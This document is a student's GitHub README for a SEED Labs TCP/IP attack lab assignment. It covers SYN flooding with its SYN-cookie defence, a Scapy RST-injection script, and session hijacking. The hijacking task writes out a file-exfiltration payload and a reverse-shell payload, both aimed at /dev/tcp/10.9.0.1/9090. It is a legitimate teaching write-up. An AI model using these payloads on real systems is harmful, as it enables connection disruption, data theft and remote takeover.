# 🛡️ TCP/IP Attack Lab — Advanced Network Security

> **Course Assignment #1** | MS Cybersecurity | NUCES Islamabad  
> **Student:** Sarmad Farooq (`25I-7722`) | **Instructor:** Dr. Zafar Iqbal

---

## 📌 Repository Overview

This repository documents a hands-on TCP/IP attack lab performed as part of the **Advanced Network Security** course at FAST-NUCES Islamabad. All attacks were executed in a **fully isolated virtual environment** using SEED Labs infrastructure — no real networks or unauthorized systems were targeted.

The lab covers four core TCP/IP attack categories: SYN Flooding, TCP RST Attack, TCP Session Hijacking, and Reverse Shell via session hijacking. Each task is documented with step-by-step methodology, code, Wireshark captures, and analysis.

---

## ⚠️ Disclaimer

> **For Educational Purposes Only.**  
> All attacks in this lab were conducted strictly within a controlled, isolated Docker-based virtual network. No real systems, external networks, or third-party machines were involved. Replicating these techniques on unauthorized systems is **illegal and unethical**.

---

## 🧪 Lab Environment

| Component        | Details                          |
|------------------|----------------------------------|
| **Host OS**      | SEED Ubuntu 20.04 VM             |
| **Attacker**     | Docker container (`seed-attacker`) |
| **Victim**       | Docker container (`victim-10.9.0.5`) |
| **Users**        | `user1-10.9.0.6`, `user2-10.9.0.7` |
| **Network**      | Isolated virtual bridge network  |
| **Docker**       | v19.03.8 + Docker Compose v1.27.4 |

---

## 🛠️ Tools & Technologies

| Tool | Purpose |
|------|---------|
| **Scapy** | Packet crafting, spoofing, and injection |
| **Wireshark** | Packet capture and traffic analysis |
| **tcpdump** | CLI-based packet sniffing |
| **Netcat (nc)** | Reverse shell listener |
| **Python 3** | Scripting SYN flood and session hijack attacks |
| **GCC / C** | Compiling high-speed SYN flood binary |
| **Docker** | Containerized victim/attacker environment |

---

## 📂 Repository Structure

```
tcp-ip-attack-lab/
│
├── README.md                    # This file
├── report/
│   └── 25I-7722_Assignment1.pdf # Full lab report (submitted)
│
├── task1-syn-flood/
│   ├── synflood.py              # Python SYN flood script
│   └── synflood.c               # C-based SYN flood program
│
├── task2-rst-attack/
│   └── rst.py                   # TCP RST packet injection script
│
├── task3-session-hijacking/
│   └── task3_hijacking.py       # TCP session hijack + data exfiltration
│
└── task4-reverse-shell/
    └── task4_hijacking.py       # Reverse shell via TCP session hijacking
```

---

## 🗂️ Tasks Summary

### Task 1 — SYN Flooding Attack

**Objective:** Exhaust the victim's TCP backlog queue by flooding it with spoofed SYN packets, preventing legitimate connections.

#### How it works:
A SYN flood exploits the TCP three-way handshake. The attacker sends massive numbers of SYN packets with **random spoofed source IPs**, forcing the victim to allocate half-open connections (SYN_RECV state) until its **Transmission Control Block (TCB)** queue is full. Legitimate users then receive "Connection timed out."

#### Sub-tasks:
- **Task 1.1 — Python (Scapy):** Slower rate; required reducing `tcp_max_syn_backlog` to 50 to succeed.
- **Task 1.2 — C program:** Much faster due to raw socket access and no interpreter overhead. Attack succeeded at default queue sizes.
- **Task 1.3 — SYN Cookie Defense:** Enabled via `sysctl -w net.ipv4.tcp_syncookies=1`. Server encodes connection info in SYN-ACK sequence number — no queue allocation until valid ACK received. **Attack neutralized.**

#### Key Commands:
```bash
# Reduce TCB queue (victim)
sysctl -w net.ipv4.tcp_max_syn_backlog=50

# Monitor half-open connections (victim)
ss -n state syn-recv sport = :23

# Enable SYN cookie defense (victim)
sysctl -w net.ipv4.tcp_syncookies=1

# Flush TCP metrics cache
ip tcp_metrics flush
```

#### Key Insight — Why is C faster than Python?
| Factor | Python | C |
|--------|--------|---|
| Execution | Interpreted | Compiled |
| Socket access | Via library | Raw socket |
| Overhead | High (GIL, interpreter) | Minimal |
| Packet rate | Low | Very high |

---

### Task 2 — TCP RST Attack

**Objective:** Terminate an active Telnet session between two hosts by injecting a spoofed TCP RST packet.

#### How it works:
The attacker sniffs an active TCP session using Wireshark/tcpdump to extract:
- Source IP & port
- Destination IP & port
- Current sequence number

A forged RST packet is then crafted with Scapy, impersonating the client. The victim server receives the RST and immediately closes the connection.

#### Attack Script (`rst.py`):
```python
from scapy.all import *

ip  = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=39180, dport=23, flags="R", seq=3887566784)
pkt = ip/tcp
send(pkt, verbose=1)
```

#### Verified Result:
Wireshark confirmed RST packets in both directions (`39180 → 23 [RST]` and `23 → 39180 [RST]`). The client session printed `Connection closed by foreign host.`

---

### Task 3 — TCP Session Hijacking

**Objective:** Inject malicious commands into an active, authenticated Telnet session to exfiltrate sensitive data from the victim.

#### How it works:
1. A legitimate Telnet session is established between User1 and the Victim.
2. The attacker sniffs TCP parameters (src/dst IP, ports, sequence & acknowledgment numbers).
3. A spoofed ACK packet is crafted carrying a shell command as payload.
4. The victim executes the injected command, piping the output back to the attacker via `ncat`.

#### Attack Script excerpt:
```python
data = "\ncat /home/seed/confidential/secret.txt > /dev/tcp/10.9.0.1/9090\n"
pkt  = ip/tcp/data
send(pkt, verbose=0)
```

#### Attacker listener:
```bash
nc -lnv 9090
# Output received: "Sarmad is Hacker"
```

#### Result: ✅ Sensitive file contents exfiltrated successfully.

---

### Task 4 — Reverse Shell via TCP Session Hijacking

**Objective:** Gain full interactive shell access on the victim machine by injecting a reverse shell command into a hijacked TCP session.

#### How it works:
Extending Task 3, the injected payload now launches `/bin/sh` on the victim and redirects I/O to the attacker's netcat listener — giving full shell control.

#### Payload:
```python
data = "\n/bin/sh -i > /dev/tcp/10.9.0.1/9090 2>&1 0<&1\n"
```

#### Result: ✅ Full reverse shell obtained. Attacker ran `ifconfig` on victim's machine remotely.

---

## 🔐 Defenses & Mitigations

| Attack | Defense Technique |
|--------|------------------|
| SYN Flood | SYN Cookies (`tcp_syncookies=1`), rate limiting, firewall rules |
| TCP RST Attack | Encrypted sessions (SSH/TLS), sequence number randomization |
| Session Hijacking | Use of encrypted protocols (SSH instead of Telnet), TLS |
| Reverse Shell | Egress filtering, network segmentation, IDS/IPS |

> **Core lesson:** Telnet is fundamentally insecure — all traffic is plaintext. Modern secure alternatives like **SSH** make all of these attacks significantly harder or impossible.

---

## 📋 Setup & Reproduction (Lab Environment Only)

```bash
# 1. Extract lab setup
cd TCP_Attack_Lab && ls  # confirm Labsetup folder

# 2. Build containers
cd Labsetup
docker-compose build

# 3. Start containers
docker-compose up -d

# 4. Verify running containers
dockps

# 5. Enter attacker container
docksh seed-attacker
```

---

## 📄 Full Report

The complete lab report with all screenshots, Wireshark captures, and analysis is available in:  
📁 [`report/25I-7722_Assignment1.pdf`](./report/25I-7722_Assignment1.pdf)

---

## 👤 Author

| Field | Details |
|-------|---------|
| **Name** | Sarmad Farooq |
| **Student ID** | 25I-7722 |
| **Program** | MS Cybersecurity |
| **Institution** | FAST-NUCES, Islamabad Campus |
| **Course** | Advanced Network Security |
| **Instructor** | Dr. Zafar Iqbal |
| **Lab Source** | [SEED Labs — TCP/IP Attack Lab](https://seedsecuritylabs.org/Labs_20.04/Networking/TCP_Attacks/) |

---

## 📚 References

- SEED Labs TCP/IP Attack Lab — [seedsecuritylabs.org](https://seedsecuritylabs.org/Labs_20.04/Networking/TCP_Attacks/)
- Wenliang Du, *Computer & Internet Security: A Hands-on Approach*, 3rd Ed.
- RFC 793 — Transmission Control Protocol
- Linux `sysctl` documentation for TCP kernel parameters

---

<div align="center">

**⭐ If you find this useful for learning, consider starring the repo.**  
*All content is for educational and academic purposes only.*

</div>
